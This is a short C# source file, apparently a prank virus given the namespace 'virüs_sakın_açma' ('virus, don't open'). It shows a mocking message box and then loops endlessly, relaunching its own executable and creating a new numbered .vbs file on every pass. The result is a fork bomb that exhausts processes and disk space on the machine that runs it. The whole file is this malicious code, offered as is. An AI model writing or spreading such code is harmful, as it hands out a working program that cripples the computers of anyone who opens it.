using System.IO;
using System.Windows.Forms;


namespace virüs_sakın_açma
{
    class vrs2
    {
        public static void vrsp2()
        {
            MessageBox.Show("hahahahahsa0");
            int i = 0;
            while (true)
            {
                System.Diagnostics.Process.Start(@"virüs_sakın_açma.exe");
                File.Create(@"betterbadness" + i + ".vbs");

                i++;
            }
        }
    }
}
